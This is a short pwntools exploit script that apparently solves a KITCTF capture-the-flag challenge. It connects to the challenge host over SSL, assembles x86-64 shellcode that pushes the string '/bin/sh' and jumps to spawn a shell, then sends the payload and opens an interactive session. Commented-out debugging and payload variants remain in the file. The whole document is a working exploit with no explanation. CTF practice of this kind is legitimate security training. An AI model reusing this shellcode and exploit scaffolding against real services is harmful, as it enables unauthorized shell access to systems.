from pwn import *
from icecream import ic

io = remote("crank-that-soulja-boy--soulja-boy-6927.ctf.kitctf.de", "443", ssl=True)
# io = process("./vuln.pl")
# gdb.attach(io, gdbscript=
# '''
# b *Perl_pp_entersub+581
# c
# c
# ''')
context.log_level = 'debug'
context.arch = 'x86-64'
def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()


payload = asm('''mov rdi, 58
    inc rdi
    mov rbx, 0x0068732f6e69622f
    push rbx
    mov rsi, rsp
    xor rdx, rdx
    xor r10, r10
    pop rbx
    sub qword ptr [rsp], 829399
    pop rbx
    call rbx
''')
# payload += b'\x0f\x05'
# payload = payload.ljust(0x30, b'a')
# payload += b'b'*8

# f = open("payload", 'wb')
# f.write(payload)
s(payload)

io.interactive()